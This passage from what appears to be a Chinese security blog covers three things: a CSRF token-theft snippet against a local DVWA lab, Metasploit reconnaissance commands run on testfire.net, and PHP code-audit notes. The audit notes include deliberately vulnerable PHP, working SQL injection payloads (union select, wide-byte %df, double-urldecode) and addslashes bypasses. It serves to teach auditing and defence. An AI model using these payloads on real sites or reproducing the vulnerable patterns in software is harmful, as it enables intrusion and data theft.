class="comment">//127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=test&amp;password_conf=test&amp;Change=Change';</span></span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="keyword">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="keyword">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Metasploit魔鬼训练营" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/"
    >Metasploit魔鬼训练营</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/" class="article-date">
  <time datetime="2020-04-01T08:48:01.000Z" itemprop="datePublished">2020-04-01</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="一、基础知识概念"><a href="#一、基础知识概念" class="headerlink" title="一、基础知识概念"></a><strong>一、基础知识概念</strong></h2><p><strong>黑盒测试：</strong>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p>
<p><strong>白盒测试：</strong>拥有客户组织所有知识的情况下，进行的渗透测试</p>
<p>PTES渗透测试标准，具体包括7个阶段：</p>
<p><strong>1.前期交互截断</strong></p>
<p>  确定渗透测试的范围、目标、限制条件以及服务合同细节。主要是收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标等</p>
<p><strong>2.情报收集阶段</strong></p>
<p><strong>3.威胁建模阶段</strong></p>
<p><strong>4.漏洞分析阶段</strong></p>
<p><strong>5.渗透攻击阶段</strong></p>
<p><strong>6.后渗透攻击阶段</strong></p>
<p><strong>7.报告阶段</strong></p>
<h2 id="二、相关命令"><a href="#二、相关命令" class="headerlink" title="二、相关命令"></a><strong>二、相关命令</strong></h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><h4 id="whois域名注册信息查询"><a href="#whois域名注册信息查询" class="headerlink" title="whois域名注册信息查询"></a><strong>whois</strong>域名注册信息查询</h4><p>一般域名注册信息包含<strong>域名所有者、服务商、管理员邮件地址、域名注册信息和过期日期</strong>等</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2019-09-08T04:08:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2020-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br></pre></td></tr></table></figure>

<p>注意：查询的时候去掉www、ftp等前缀，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是abc.com的一个子域名</p>
<hr>
<h4 id="nslookup与dig域名查询"><a href="#nslookup与dig域名查询" class="headerlink" title="nslookup与dig域名查询"></a>nslookup与dig域名查询</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=A  <span class="comment">#可以对其ip地址进行解析   set type=MX 可以查找邮件转发服务器</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; dig @ASIA3.AKAM.NET testfire.net  #使用方法--dig @DNS服务器 待查询的域名</span><br><span class="line">[*] exec: dig @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 53989</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;testfire.net.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">testfire.net.           86400   IN      A       65.61.137.117</span><br><span class="line"></span><br><span class="line">;; Query time: 300 msec</span><br><span class="line">;; SERVER: 23.211.61.64#53(23.211.61.64)</span><br><span class="line">;; WHEN: 四 4月 23 22:19:09 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 57</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-代码审计" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"
    >代码审计</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time datetime="2020-03-26T06:15:23.000Z" itemprop="datePublished">2020-03-26</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
  </div>

      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="PHP核心配值解释"><a href="#PHP核心配值解释" class="headerlink" title="PHP核心配值解释"></a>PHP核心配值解释</h2><p>​                                                                       <strong>PHP_INI_* 模式的定义</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><em>PHP_INI_USER</em></td>
<td>可在用户脚本（例如  ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_PERDIR</em></td>
<td>可在 php.ini，.htaccess 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_SYSTEM</em></td>
<td>可在 php.ini 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_ALL</em></td>
<td>可在任何地方设定</td>
</tr>
<tr>
<td><em>php_ini only</em></td>
<td>仅可在php.ini中配值</td>
</tr>
</tbody></table>
<h3 id="1-register-globals-全局变量注册开关"><a href="#1-register-globals-全局变量注册开关" class="headerlink" title="1.register_globals(全局变量注册开关)"></a><strong>1.register_globals(全局变量注册开关)</strong></h3><p>on——会直接把拥护GET、POST等方式提交上来的参数注册成全局变量，并初始化值为参数对应的值，使得题交参数可以直接在脚本中使用。</p>
<p>PHP5.4.0以下的版本可以正常使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'chj'</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3" style="zoom: 80%;">

<h3 id="2-allow-url-include-是否允许包含远程文件"><a href="#2-allow-url-include-是否允许包含远程文件" class="headerlink" title="2.allow_url_include(是否允许包含远程文件)"></a><strong>2.allow_url_include(是否允许包含远程文件)</strong></h3><p>on——可以直接包含远程文件   </p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" style="zoom:80%;">

<h3 id="3-magic-quotes-gpc-魔术引号自动过滤"><a href="#3-magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="3.magic_quotes_gpc(魔术引号自动过滤)"></a><strong>3.magic_quotes_gpc(魔术引号自动过滤)</strong></h3><p>on——会自动在GET、POST、COOKIE变量中的 ‘  ‘’  \  以及空字符NULL 的前面加上反斜杠（\）</p>
<p>但是PHP5中的magic_quotes_gpc并<strong>不会过滤$_SERVER变量</strong>，导致很多<strong>类似client-ip,referer</strong>一类的漏洞能够利用。</p>
<p>PHP5.4版本之后<strong>取消了magic_quotes_gpc</strong></p>
<p>PHP版本小于4.2.3时，配值范围是PHP_INI_ALL</p>
<p>PHP版本大于4.2.3时，是PHP_INI_PERDIR</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'chj'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt></p>
<h3 id="4-magic-quotes-runtime-魔术引号自动过滤"><a href="#4-magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="4.magic_quotes_runtime(魔术引号自动过滤)"></a><strong>4.magic_quotes_runtime(魔术引号自动过滤)</strong></h3><p>magic_quotes_runtime和magic_quotes_gpc功能一样，区别是处理的对象不一样</p>
<p>magic_quotes_runtime<strong>只对从数据库或者文件中获取的数据进行过滤</strong></p>
<p>由于很多人只对外部输入的数据进行过滤，所以有的攻击者可先将攻击代码写入数据库，在程序读取后即可触发攻击</p>
<p>同样<strong>在PHP5.4版本以后也取消了</strong></p>
<p>注意，只有部分函数受它影响，所以是可以绕过这个配值的。</p>
<p>受影响的包括get_meta_tags()、stream_socket_recvform()、exec()…等等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件1.txt  1 '2"3\4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"magic_quotes_runtime"</span>,<span class="string">"1"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"D:/phpstudy_pro/WWW/phpsafe/1.txt"</span>);<span class="comment">#把整个文件读入一个字符串中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> \<span class="string">'2\"3\\4</span></span><br></pre></td></tr></table></figure>

<h3 id="5-magic-quotes-sybase-魔术引号自动过滤"><a href="#5-magic-quotes-sybase-魔术引号自动过滤" class="headerlink" title="5.magic_quotes_sybase(魔术引号自动过滤)"></a><strong>5.magic_quotes_sybase(魔术引号自动过滤)</strong></h3><p>magic_quotes_sybase指令用于自动过滤特殊字符，设置为on时，会覆盖gpc的配值</p>
<p>它和gpc的区别在于，仅仅转义了空字符和把单引号( ’ )变成了双引号( “ )</p>
<p>在PHP5.4.0中移除了</p>
<h3 id="6-safe-mode-安全模式"><a href="#6-safe-mode-安全模式" class="headerlink" title="6.safe_mode(安全模式)"></a><strong>6.safe_mode(安全模式)</strong></h3><p>安全模式是PHP内嵌的一种安全机制，当safe_mode=on时：</p>
<p>（1）所有文件操作函数都会收到限制</p>
<p>（2）通过函数popen()、system()以及exec()等函数执行命令或程序会提示错误</p>
<h3 id="7-open-basedir-PHP-可访问目录"><a href="#7-open-basedir-PHP-可访问目录" class="headerlink" title="7.open_basedir PHP 可访问目录"></a><strong>7.open_basedir PHP 可访问目录</strong></h3><p>open_basedi指令用来限制PHP只能访问哪些目录</p>
<p>例如配值open_basedi=/www/a，那么目录/www/a 和 /www/ab 都是可以访问的。</p>
<p>如果open_basedi=/www/a/，那么只能访问/www/a/</p>
<p>PHP版本小于5.2.3时，是PHP_INI_SYSTEM，</p>
<p>大于等于5.2.3是PHP_INI_ALL</p>
<h3 id="8-disable-functions-禁用函数"><a href="#8-disable-functions-禁用函数" class="headerlink" title="8.disable_functions(禁用函数)"></a><strong>8.disable_functions(禁用函数)</strong></h3><p>在正式的生产环境中，为了更安全的运行PHP，使用此指令来禁止一些敏感函数的使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=phpinfo,<span class="keyword">eval</span>,passthru,exec,system</span><br></pre></td></tr></table></figure>

<p>配值禁用函数的时候，按照以上格式分割函数名，配值范围是php.ini only</p>
<p>切记，也要把dl()函数加到禁用列表，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破限制。</p>
<h3 id="9-display-errors和error-reporting-错误显示"><a href="#9-display-errors和error-reporting-错误显示" class="headerlink" title="9.display_errors和error_reporting 错误显示"></a><strong>9.display_errors和error_reporting 错误显示</strong></h3><p>display_errors 表示是否显示PHP脚本内部错误，在调试的时候通常打开，但是在生产环境中建议关闭。</p>
<p>error_reporting 是用来配值错误显示的级别。</p>
<hr>
<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h3 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h3><hr>
<h2 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a><strong>漏洞挖掘与防范（基础篇）</strong></h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a><strong>1.SQL注入</strong></h3><p>本质：SQL注入是直接面对数据库进行攻击的</p>
<p>攻击方式：</p>
<p>一、在权限较大的情况下，可通过SQL注入直接写入webshell或者直接执行系统命令</p>
<p>二、在权限较小的情况下，可获得管理员密码等，或者修改数据库内容进行钓鱼等</p>
<p>常用工具：sqlmap</p>
<p>挖掘经验：sql注入经常出现在登录页面、获取HTTP头、订单处理等</p>
<p>登录页面的注入多数发生在HTTP头里面的client-ip和x-forward-for</p>
<p>1.1普通注入</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$uid=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id=$uid"</span>;</span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>);</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.1php?id=-1 union select 1,user(),3,4</span></span><br><span class="line">当前SQL语句：SELECT*FROM userinfo where id=<span class="number">-1</span> union select <span class="number">1</span>,user(),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">结果：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> [<span class="number">1</span>] =&gt; root@localhost [<span class="number">2</span>] =&gt; <span class="number">3</span> [<span class="number">3</span>] =&gt; <span class="number">4</span> )</span><br></pre></td></tr></table></figure>

<p>需要注意的是，7.x版本中已经舍弃了mysql_connect()，所以需要改为mysqli_connect()</p>
<table>
<thead>
<tr>
<th><strong>mysqli_fetch_row()</strong></th>
<th><strong>从结果集中取得一行，并作为枚举数组返回。</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>mysqli_select_db()</strong></td>
<td><strong>用于更改连接的默认数据库</strong></td>
</tr>
<tr>
<td><strong>mysqli_query()</strong></td>
<td><strong>执行某个针对数据库的查询。</strong></td>
</tr>
<tr>
<td><strong>mysqli_connect()</strong></td>
<td><strong>打开一个到 MySQL 服务器的新的连接</strong></td>
</tr>
</tbody></table>
<p>从上述测试代码可以知道，数据库操作存在一些关键词如mysqli_query等，查询方式还有update、insert、delete等</p>
<p>在做白盒审计的时候，只需要查找这些关键字就可以定向挖掘SQL注入漏洞。</p>
<h3 id="2-编码注入-宽字节注入"><a href="#2-编码注入-宽字节注入" class="headerlink" title="2.编码注入-宽字节注入"></a><strong>2.编码注入-宽字节注入</strong></h3><p>程序在操作前会进行一些编码处理，通过输入转码函数不兼容的特殊字符，可以导致输出的字符变成有害数据</p>
<p>最常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的</p>
<p><strong>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</strong></p>
<p>这是由于单引号被自动转义成 \‘  , 前面的<strong>%df和转义字符\ 反斜杠(%5c) 组合成了 %df%5c</strong> 。也就是運字</p>
<p>这时候单引号依然还在，于是成功闭合了前面的单引号</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>)<span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line">mysqli_query($conn,<span class="string">"set names 'gbk'"</span>);</span><br><span class="line">$uid=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id='$uid'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"wro"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%df<span class="string">' union select 1,2,3,4#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前SQL语句：<span class="keyword">SELECT</span> <span class="keyword">id</span>,username <span class="keyword">FROM</span> userinfo <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'�\'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">#'</span></span><br><span class="line">结果：<span class="built_in">Array</span> ( [<span class="number">0</span>] =&gt; <span class="keyword">test</span> [<span class="number">1</span>] =&gt; root@localhost )</span><br></pre></td></tr></table></figure>

<h3 id="3-二次urldecode注入"><a href="#3-二次urldecode注入" class="headerlink" title="3.二次urldecode注入"></a><strong>3.二次urldecode注入</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=addslashes($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b;</span><br></pre></td></tr></table></figure>

<p>输入：<strong>?p=1%2527</strong></p>
<p>输出：*<em>$a=1%27     *</em></p>
<p>​           <strong>$b=1’</strong></p>
<p>现在的Web程序通常用<strong>addslashes()、mysql_real_escape_string()、mysql_escape_string()函数</strong></p>
<p>或者开启GPC对<strong>单引号、双引号、\  和NULL 加  \   转义</strong></p>
<p>但如果使用<strong>了urldecode or  rawurldecode 函数</strong> 会导致二次解码生成单引号而引发注入</p>
<p>4.espcms 搜索注入分析</p>
<p>部分代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key=urldecode(<span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">'key'</span>,<span class="string">'R'</span>));</span><br><span class="line">···</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">	$db_where.=<span class="string">"AND FIND_IN_SET('$key',tags)"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于$key变量使用了urldecode，从而可以绕过GPC</p>
<p>如果$key不为空，则拼接到SQL语句中，导致产生注入漏洞</p>
<h3 id="4-漏洞防范"><a href="#4-漏洞防范" class="headerlink" title="4.漏洞防范"></a><strong>4.漏洞防范</strong></h3><p>在PHP5.4版本之前可以用魔术引号解决</p>
<p>后面虽然被取消了，但可以用<strong>过滤函数和类</strong>来解决</p>
<p>如discuz、dedecms、phpcms等程序都使用了过滤类</p>
<p>但仍然存在绕过的问题，最好的解决方法是利用<strong>预编译的方式</strong></p>
<h4 id="4-1-gpc-rutime-魔术引号"><a href="#4-1-gpc-rutime-魔术引号" class="headerlink" title="4.1 gpc/rutime 魔术引号"></a><strong>4.1 gpc/rutime 魔术引号</strong></h4><p>通常数据污染有2种，一种是GET、POST等被动接收参数</p>
<p>还有一种是主动获取参数，如读取远程页面或者文件内容</p>
<p>所以防止SQL注入，就是要守住这2条路！</p>
<p>魔术引号对int型的注入是没多大作用的。</p>
<h4 id="4-2-过滤函数和类"><a href="#4-2-过滤函数和类" class="headerlink" title="4.2 过滤函数和类"></a><strong>4.2 过滤函数和类</strong></h4><p>过滤函数和类有2种使用场景，一种是程序入口统一过滤，像框架程序用的多</p>
<p>另一种是在程序进行SQL语句之前使用，除了PHP内置的一些过滤单引号等函数外</p>
<p>还有一些开源类过滤union、select等关键字</p>
<p><strong>1.addslashes</strong>函数</p>
<p>以下方法可以绕过该函数</p>
<table>
<thead>
<tr>
<th>$userid = urldecode($userid)</th>
<th>注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</th>
</tr>
</thead>
<tbody><tr>
<td><strong>$userid = rawurldecode($userid)</strong></td>
<td></td>
</tr>
<tr>
<td><strong>$userid = base64_decode($userid)</strong></td>
<td><strong>首先通过addslashes()过滤，然后urlencode解码</strong></td>
</tr>
<tr>
<td><strong>$userid = json_encode($userid)</strong></td>
<td><strong>该函数把\转换为\，两个反斜杠抵消。</strong></td>
</tr>
</tbody></table>
<p><strong>2.mysql_ (real_) escape_string 函数</strong></p>
<p>这2个函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00 \n \r \ &#39; &quot; \xla    这些字符受到影响</span><br></pre></td></tr></table></figure>

<p>推荐使用mysql_real_escape_string() ，因为它接受的是一个连接句柄并根据当前字符集转义字符串</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"select * from test where id=' "</span>.$id.<span class="string">" '  "</span>;</span><br></pre></td></tr></table></figure>

<p>当id=1’ 时，输出id=’ 1 \ ‘’</p>
<p><strong>3.intval 等字符转换</strong></p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=intval(<span class="string">"1 union select"</span>);</span><br><span class="line"><span class="keyword">echo</span> $id;  <span class="comment">#输出为1</span></span><br></pre></td></tr></table></figure>

<p>intval 是将变量转换成int型,可以防止盲注等方式绕过。</p>
<h4 id="4-3-PDO-prepare-预编译"><a href="#4-3-PDO-prepare-预编译" class="headerlink" title="4.3 PDO prepare 预编译"></a><strong>4.3 PDO prepare 预编译</strong></h4><h3 id="5-XSS漏洞"><a href="#5-XSS漏洞" class="headerlink" title="5.XSS漏洞"></a><strong>5.XSS漏洞</strong></h3><p>在Web漏洞中，XSS是最多的！它可以通过外部输入然后直接在浏览器端触发，即<strong>反射型XSS</strong></p>
<p>还可以通过把代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面时触发–<strong>存储型XSS</strong></p>
<p>危害：前端页面能做的事情，它都可以（如获取cookie，修改页面钓鱼等）</p>
<h4 id="5-1-挖掘经验"><a href="#5-1-挖掘经验" class="headerlink" title="5.1 挖掘经验"></a><strong>5.1 挖掘经验</strong></h4><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数</p>
<p>常用的输出函数如下：<strong>var_dump、var_export、die、sprintf、print、print_r、echo、printf</strong></p>
<p>所以只需要寻作带有变量的这些函数即可</p>
<p>注意：<strong>浏览器环境十分影响XSS漏洞的利用</strong>，还需要掌握各种<strong>浏览器容错、编码等特性和数据协议</strong></p>
<p>XSS漏洞经常出现在<strong>文章发表、评论回复、留言以及资料设置</strong>等地方</p>
<p>因为这里有各种图片引用、文字格式设置等，经常出现<strong>对标签事件过滤不严格</strong>导致的XSS</p>
<p>还有就是用户昵称可能不止一处可以修改，不一定所有地方都严格过滤了，所以可以多关注这几个地方</p>
